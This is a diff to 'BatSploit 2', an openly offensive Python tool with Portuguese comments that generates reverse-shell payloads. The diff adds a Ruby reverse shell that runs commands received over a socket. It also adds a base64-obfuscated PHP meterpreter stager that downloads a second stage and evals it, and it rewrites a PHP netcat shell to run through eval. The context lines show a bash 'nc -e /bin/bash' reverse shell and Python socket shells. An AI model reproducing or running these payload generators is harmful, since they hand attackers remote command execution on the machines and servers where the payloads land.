@@ -31,7 +31,6 @@ class BatSploit(object):
 			os.system("cls") # if windows
 		else:
 			os.system("clear") # if linux or mac
-		print ""
 		#sys.stdout.write(colored("     _{___{__}\n", "white"))
 		#sys.stdout.write(colored("    {_}      `\)\n", "white"))           
 		#sys.stdout.write(colored("   {_}        `            _.-''''--.._\n", "white"))
@@ -43,6 +42,7 @@ class BatSploit(object):
 		#sys.stdout.write(colored("  BatSploit 2.0", "green"))
 		#sys.stdout.write(colored(" << << << <<    \ `--'  /---)\n", "white"))
 		#sys.stdout.write(colored("            ^  ^  ^  ^     `-.....--'''\n", "white"))
+		print ""
 		print colored(" _____________", "white")
 		print colored("<", "white") + colored(" BatSploit 2 ", "green") + colored(">", "white")
 		print colored(" -------------", "white")
@@ -95,12 +95,12 @@ class BatSploit(object):
 		sys.stdout.write(colored(" Usage to start handler ", "white"))
 		sys.stdout.write(colored("======\n", "green"))
 		sys.stdout.write(colored("\n[+] "+name, "green"))
-		sys.stdout.write(colored(" -payload python/batsploit_reverse_tcp LHOST=127.0.0.1 LPORT=1337 payload.py\n", "white"))
+		sys.stdout.write(colored(" -payload python/batsploit/reverse_tcp LHOST=127.0.0.1 LPORT=1337 payload.py\n", "white"))
 
 	def list_payloads(self):
 		# essa função lista os payloads
 		print "\n[!] Payloads List"
-		payloads = ['python/netcat_reverse_tcp', 'python/batsploit_reverse_tcp', 'python/meterpreter_reverse_tcp', 'windows/netcat_reverse_tcp', 'linux/netcat_reverse_tcp', 'php/socket_reverse_tcp', 'php/netcat_reverse_tcp'] # tupple contendo os payloads
+		payloads = ['python/netcat_reverse_tcp', 'python/batsploit/reverse_tcp', 'python/meterpreter/reverse_tcp', 'windows/netcat/reverse_tcp', 'linux/netcat/reverse_tcp', 'php/socket/reverse_tcp', 'php/netcat/reverse_tcp', 'php/meterpreter/reverse_tcp', 'ruby/netcat/reverse_tcp'] # tupple contendo os payloads
 		for payload in payloads:
 			sys.stdout.write(colored("\n[+] ", "green"))
 			sys.stdout.write(colored(payload, "white"))
@@ -140,7 +140,7 @@ class BatSploit(object):
 		sys.stdout.write(colored("\n ======", "green"))
 		sys.stdout.write(colored(" Creating Payload : %s "%(payload), "white"))
 		sys.stdout.write(colored("======\n", "green"))
-		if payload == 'python/netcat_reverse_tcp':
+		if payload == 'python/netcat/reverse_tcp':
 			# code ...
 			code = "import socket,os\n"
 			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
@@ -170,7 +170,7 @@ class BatSploit(object):
 				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
 				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
-		elif payload == 'python/batsploit_reverse_tcp':
+		elif payload == 'python/batsploit/reverse_tcp':
 			# code
 			code = "import socket, os\n"
 			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
@@ -203,7 +203,7 @@ class BatSploit(object):
 				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
 				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
-		elif payload == 'windows/netcat_reverse_tcp':
+		elif payload == 'windows/netcat/reverse_tcp':
 			# code 
 			code = "@echo off\n"
 			code += "color 7f && mode 20, 10\n"
@@ -230,7 +230,7 @@ class BatSploit(object):
 				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
 				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
-		elif payload == 'linux/netcat_reverse_tcp':
+		elif payload == 'linux/netcat/reverse_tcp':
 			# code
 			code = "#!/bin/bash\n"
 			code += "nc %s %i -e /bin/bash &> dismown && clear"%(host, port)
@@ -253,7 +253,7 @@ class BatSploit(object):
 				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
 				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
-		elif payload == 'php/socket_reverse_tcp':
+		elif payload == 'php/socket/reverse_tcp':
 			# code 
 			code = "<?php\n"
 			code += "$s = socket_create(AF_INET, SOCK_STREAM, 0);\n"
@@ -281,7 +281,7 @@ class BatSploit(object):
 				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
 				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
-		elif payload == 'python/meterpreter_reverse_tcp':
+		elif payload == 'python/meterpreter/reverse_tcp':
 			# code ...
 			code = "import socket,struct\n"
 			code += "s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
@@ -312,12 +312,86 @@ class BatSploit(object):
 				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
 			elif self.platform == "Linux":
 				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
-		elif payload == 'php/netcat_reverse_tcp':
+		elif payload == 'php/netcat/reverse_tcp':
 			# code ...
-			code = "<?php $s=fsockopen('%s',%i);while($s): fwrite($s, fread(popen(fread($s, 1024), 'r'), 20000)); endwhile;?>"%(host, port)
+			code = "$s=fsockopen('%s',%i);while($s): fwrite($s, fread(popen(fread($s, 1024), 'r'), 20000)); endwhile;"%(host, port)
 			encode = code.encode('base64').replace("\n", "")
 			payload_coded = "<?php $string=base64_decode('%s');\n"%(encode)
-			payload_coded += "$new_file=md5(uniqid()).'.php';$h=fopen($new_file,'w');fwrite($h,$string);exec('php '.$new_file);?>"
+			payload_coded += "eval($string);?>"
+			payload_file = open(name, 'w') # abri o arquivo dst
+			payload_file.write(payload_coded)
+			payload_file.close() # fecha o arquivo
+			size_payload = os.path.getsize(name) # tamanho do payload
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Payload was created ! \n", "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+			if self.platform == "Windows":
+				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+			elif self.platform == "Linux":
+				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+		elif payload == 'ruby/netcat/reverse_tcp':
+			# code ...
+			code = "require 'socket'\n"
+			code += "s=TCPSocket.open('%s', %i)\n"%(host,port)
+			code += "while msg = s.gets\n"
+			code += "	IO.popen(msg, 'r') do |pipe|\n"
+			code += "		s.puts pipe.gets\n"
+			code += "	end\n"
+			code += "end\n"
+			code += "s.close"
+			payload_file = open(name, 'w') # abri o arquivo dst
+			payload_file.write(code) # escreve o código no arquivo
+			payload_file.close() # fecha o arquivo
+			size_payload = os.path.getsize(name) # tamanho do payload
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Payload was created ! \n", "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LHOST : %s"%(host), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("LPORT : %i"%(port), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Name : %s "%(name), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Size : %i bytes "%(size_payload), "white"))
+			sys.stdout.write(colored("\n[+] ", "green"))
+			sys.stdout.write(colored("Path : compiled/%s\n"%(name), "white"))
+			if self.platform == "Windows":
+				os.system('@echo off && move "%s" "compiled/%s" > null && del null'%(name, name)) # move o arquivo para a pasta compiled
+			elif self.platform == "Linux":
+				os.system("mv %s compiled/%s"%(name, name)) # move o arquivo para a pasta compiled
+		elif payload == "php/meterpreter/reverse_tcp":
+			# code ...
+			code = "$host = '%s';\n"%(host)
+			code += "$port = %i;\n"%(port)
+			code += "$s = fsockopen($host, $port);\n"
+			code += "$s_type = 'stream';\n"
+			code += "$len = fread($s, 4);\n"
+			code += '$a = unpack("Nlen", $len);'
+			code += "\n$len = $a['len'];\n"
+			code += "$b = '';\n"
+			code += "while(strlen($b) < $len){\n"
+			code += "	switch($s_type){\n"
+			code += "		case 'stream': $b .= fread($s, $len-strlen($b)); break;\n"
+			code += "	}\n"
+			code += "}\n"
+			code += "$GLOBALS['msgsock'] = $s;\n"
+			code += "$GLOBALS['msgsock_type'] = $s_type;\n"
+			code += "eval($b);\n"
+			code += "die();"
+			encode = code.encode('base64').replace("\n", "");
+			payload_coded = "<?php\n"
+			payload_coded += "$string=base64_decode('%s');\n"%(encode)
+			payload_coded += "eval($string);\n"
+			payload_coded += "?>"
 			payload_file = open(name, 'w') # abri o arquivo dst
 			payload_file.write(payload_coded)
 			payload_file.close() # fecha o arquivo
